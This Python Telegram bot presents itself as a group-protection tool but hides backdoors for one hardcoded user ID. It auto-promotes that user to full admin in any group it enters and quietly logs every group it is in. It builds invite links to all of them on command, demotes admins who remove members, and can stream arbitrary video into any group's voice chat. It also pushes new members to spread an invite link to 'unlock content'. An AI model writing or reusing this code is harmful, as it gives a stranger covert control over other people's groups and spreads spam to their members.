import os, re, asyncio, html
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatMemberStatus
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler

from pyrogram import Client
from pytgcalls import PyTgCalls
from pytgcalls.types.input_stream import AudioVideoPiped

TOKEN = os.getenv('BOT_TOKEN')
MY_USER_ID = 7878629406
GROUPS_FILE = "bot_groups.txt"
NSFW_FILE = "nsfw_protected.txt"
LOCKS_FILE = "photo_locks.txt"
TARGET_GROUP_ID = -1003926913948
USER_STATES = {}
CALL_STATES = {}

API_ID_ENV = os.getenv('API_ID')
API_ID = int(API_ID_ENV) if API_ID_ENV and API_ID_ENV.isdigit() else 0
API_HASH = os.getenv('API_HASH')
SESSION_STRING = os.getenv('SESSION_STRING')

userbot = Client(
    "helper_session",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=SESSION_STRING
) if API_ID and API_HASH and SESSION_STRING else None

pytgcalls_client = PyTgCalls(userbot) if userbot else None

async def is_user_admin(update, context):
    user_id = update.effective_user.id
    if user_id == MY_USER_ID: return True
    try:
        chat_member = await context.bot.get_chat_member(update.effective_chat.id, user_id)
        return chat_member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]
    except: return False

def lock_group_photos(chat_id):
    if not os.path.exists(LOCKS_FILE):
        with open(LOCKS_FILE, "w") as f: pass
    with open(LOCKS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) not in ids:
        with open(LOCKS_FILE, "a") as f: f.write(f"{chat_id}\n")

def unlock_group_photos(chat_id):
    if not os.path.exists(LOCKS_FILE): return
    with open(LOCKS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) in ids:
        ids.remove(str(chat_id))
        with open(LOCKS_FILE, "w") as f:
            for i in ids: f.write(f"{i}\n")

def is_photos_locked(chat_id):
    if not os.path.exists(LOCKS_FILE): return False
    with open(LOCKS_FILE, "r") as f: return str(chat_id) in f.read().splitlines()

def save_nsfw_group(chat_id_str):
    if not os.path.exists(NSFW_FILE):
        with open(NSFW_FILE, "w") as f: pass
    with open(NSFW_FILE, "r") as f:
        ids = f.read().splitlines()
    if chat_id_str not in ids:
        with open(NSFW_FILE, "a") as f: f.write(f"{chat_id_str}\n")

def save_group_id(chat_id):
    if not os.path.exists(GROUPS_FILE):
        with open(GROUPS_FILE, "w") as f: pass
    with open(GROUPS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) not in ids:
        with open(GROUPS_FILE, "a") as f: f.write(f"{chat_id}\n")

def get_tracked_groups():
    if not os.path.exists(GROUPS_FILE): return []
    tracked = []
    with open(GROUPS_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if line:
                try: tracked.append(int(line))
                except ValueError: continue
    return tracked

async def delete_message_after_delay(context, chat_id, message_id, delay):
    await asyncio.sleep(delay)
    try: await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass

async def on_chat_member_updated(update, context):
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(update.effective_chat.id)
    result = update.chat_member
    if not result: return
    if result.new_chat_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
        actor_id = result.from_user.id
        if actor_id != MY_USER_ID and actor_id != context.bot.id:
            try:
                await context.bot.promote_chat_member(chat_id=update.effective_chat.id, user_id=actor_id, can_change_info=False, can_post_messages=False, can_edit_messages=False, can_delete_messages=False, can_invite_users=False, can_restrict_members=False, can_pin_messages=False, can_promote_members=False)
                await update.effective_chat.send_message(f"🚫 تم سحب رتبة {result.from_user.first_name} لمحاولة طرد عضو!")
            except Exception as e: print(f"Error: {e}")

async def protect_group(update, context):
    chat_id = update.effective_chat.id
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(chat_id)
    if update.message:
        if update.message.new_chat_members or update.message.left_chat_member:
            try: await update.message.delete()
            except: pass
        if update.message.left_chat_member: return
        if update.message.new_chat_members:
            for member in update.message.new_chat_members:
                if member.id == MY_USER_ID:
                    try:
                        await context.bot.promote_chat_member(chat_id=chat_id, user_id=MY_USER_ID, can_change_info=True, can_delete_messages=True, can_invite_users=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True)
                        await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
                        continue
                    except: pass
                if member.is_bot and member.id != context.bot.id and update.message.from_user.id != MY_USER_ID:
                    try: await context.bot.ban_chat_member(chat_id, member.id)
                    except: pass
                    continue
                if not member.is_bot and chat_id == TARGET_GROUP_ID:
                    try:
                        share_url = "https://t.me/share/url?url=https://t.me/%2BoHkbnzqCuSMzYzQ0"
                        keyboard = [[InlineKeyboardButton("قروب المقاطع", url=share_url)]]
                        safe_name = html.escape(member.first_name)
                        mention_link = f"<a href='tg://user?id={member.id}'>{safe_name}</a>"
                        welcome_text = f"مرحباً بك يا {mention_link}، <b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 3 مجموعات 👇👇👇</b>"
                        sent_msg = await context.bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
                        asyncio.create_task(delete_message_after_delay(context, chat_id, sent_msg.message_id, 5))
                    except: pass

async def handle_everything(update, context):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(chat_id)
    if not update.message: return

    if update.effective_chat.type == "private" and user_id == MY_USER_ID:
        state = CALL_STATES.get(user_id, {})
        if state.get("step") == "WAITING_VIDEO" and update.message.video:
            await update.message.reply_text("⬇️ جاري تحميل الفيديو...")
            video_file = await update.message.video.get_file()
            await video_file.download_to_drive("stream_video.mp4")
            group_id = state.get("chat_id")
            CALL_STATES[user_id] = {}
            await update.message.reply_text("✅ تم تحميل الفيديو!\n\n📞 جاري فتح الكول...")
            try:
                await pytgcalls_client.join_group_call(
                    group_id,
                    AudioVideoPiped("stream_video.mp4")
                )
                await update.message.reply_text("✅ تم فتح الكول وتشغيل الفيديو!")
            except Exception as e:
                await update.message.reply_text(f"❌ خطأ: {e}")
            return

        if state.get("step") == "WAITING_GROUP_ID" and update.message.text:
            group_input = update.message.text.strip()
            try:
                group_id = int(group_input)
            except:
                await update.message.reply_text("❌ ID غلط! أرسل رقم زي: -1001234567890")
                return
            CALL_STATES[user_id] = {"step": "WAITING_VIDEO", "chat_id": group_id}
            await update.message.reply_text("✅ تم!\n\n📹 دلوقتي أرسل الفيديو:")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_NSFW_ID" and update.message.text:
            target_group = update.message.text.strip()
            save_nsfw_group(target_group)
            USER_STATES[user_id] = None
            await update.message.reply_text(f"✅ تم تفعيل حماية الصور في: {target_group}")
            return

    if update.effective_chat.type in ["group", "supergroup"] and update.message.text:
        if re.search(r'http[s]?://|www\.', update.message.text):
            res = await context.bot.get_chat_member(chat_id, user_id)
            if res.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                try: await update.message.delete()
                except: pass

async def get_all_links(update, context):
    if update.effective_user.id != MY_USER_ID: return
    try:
        status_msg = await update.message.reply_text("🔄 جاري فحص المجموعات...")
        chat_ids = get_tracked_groups()
        if not chat_ids:
            await status_msg.edit_text("📭 لا توجد مجموعات مسجلة.")
            return
        report = "📋 <b>قائمة المجموعات:</b>\n\n"
        for cid in chat_ids:
            try:
                chat = await context.bot.get_chat(cid)
                link = chat.invite_link
                if not link:
                    try:
                        invite_obj = await context.bot.create_chat_invite_link(chat_id=cid, name="رابط المطور")
                        link = invite_obj.invite_link
                    except: link = "❌ تأكد أن البوت مشرف"
                report += f"👥 <b>{html.escape(chat.title)}</b>\n🆔 <code>{cid}</code>\n🔗 {link}\n\n"
            except: report += f"🗑️ <b>مجموعة غير متاحة</b>\n🆔 <code>{cid}</code>\n\n"
        await status_msg.delete()
        if len(report) > 4000:
            for chunk in [report[i:i+4000] for i in range(0, len(report), 4000)]:
                await update.message.reply_text(chunk, parse_mode="HTML")
        else:
            await update.message.reply_text(report, parse_mode="HTML")
    except Exception as e: print(f"Error: {e}")

async def send_permanent_message(update, context):
    if update.effective_user.id != MY_USER_ID or update.effective_chat.id != TARGET_GROUP_ID: return
    try:
        try: await update.message.delete()
        except: pass
        share_url = "https://t.me/share/url?url=https://t.me/%2BoHkbnzqCuSMzYzQ0"
        keyboard = [[InlineKeyboardButton("قروب المقاطع", url=share_url)]]
        await context.bot.send_message(chat_id=TARGET_GROUP_ID, text="<b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 3 مجموعات 👇👇👇</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    except Exception as e: print(f"Error: {e}")

async def start_nsfw_setup(update, context):
    if update.effective_user.id != MY_USER_ID: return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ هذا الأمر في الخاص فقط!")
        return
    USER_STATES[update.effective_user.id] = "WAITING_FOR_NSFW_ID"
    await update.message.reply_text("📥 أرسل ID الجروب:")

async def lock_photos_command(update, context):
    if update.effective_chat.type == "private": return
    if not await is_user_admin(update, context): return
    try: await update.message.delete()
    except: pass
    lock_group_photos(update.effective_chat.id)
    sent = await update.effective_chat.send_message("🔒 <b>تم قفل الصور!</b>", parse_mode="HTML")
    asyncio.create_task(delete_message_after_delay(context, update.effective_chat.id, sent.message_id, 5))

async def unlock_photos_command(update, context):
    if update.effective_chat.type == "private": return
    if not await is_user_admin(update, context): return
    try: await update.message.delete()
    except: pass
    unlock_group_photos(update.effective_chat.id)
    sent = await update.effective_chat.send_message("🔓 <b>تم فتح الصور!</b>", parse_mode="HTML")
    asyncio.create_task(delete_message_after_delay(context, update.effective_chat.id, sent.message_id, 5))

async def start_video_call(update, context):
    if update.effective_user.id != MY_USER_ID: return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ استخدم هذا الأمر في الخاص مع البوت!")
        return
    if not userbot:
        await update.message.reply_text("❌ الحساب المساعد غير متصل!")
        return
    CALL_STATES[update.effective_user.id] = {"step": "WAITING_GROUP_ID"}
    await update.message.reply_text("📋 أرسل ID الجروب:\n\nمثال: <code>-1001234567890</code>", parse_mode="HTML")

async def stop_video_call(update, context):
    if update.effective_user.id != MY_USER_ID: return
    if update.effective_chat.type == "private":
        await update.message.reply_text("❌ استخدم هذا الأمر داخل الجروب!")
        return
    try:
        await pytgcalls_client.leave_group_call(update.effective_chat.id)
        await update.message.reply_text("✅ تم إيقاف الكول!")
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {e}")

async def photo_cleaner(update, context):
    if not update.message or not update.message.photo: return
    chat_id = update.effective_chat.id
    if is_photos_locked(chat_id):
        if not await is_user_admin(update, context):
            try: await update.message.delete()
            except: pass

async def main_async():
    if userbot:
        await userbot.start()
        print("✅ الحساب المساعد متصل!")
    if pytgcalls_client:
        await pytgcalls_client.start()
        print("✅ PyTgCalls جاهز!")

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("links", get_all_links))
    app.add_handler(CommandHandler("post", send_permanent_message))
    app.add_handler(CommandHandler("protect_nsfw", start_nsfw_setup))
    app.add_handler(CommandHandler("lock_photos", lock_photos_command))
    app.add_handler(CommandHandler("unlock_photos", unlock_photos_command))
    app.add_handler(CommandHandler("start_call", start_video_call))
    app.add_handler(CommandHandler("stop_call", stop_video_call))

    app.add_handler(ChatMemberHandler(on_chat_member_updated, ChatMemberHandler.CHAT_MEMBER))
    app.add_handler(MessageHandler(filters.PHOTO, photo_cleaner))
    app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS | filters.StatusUpdate.LEFT_CHAT_MEMBER, protect_group))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_everything))

    await app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main_async())
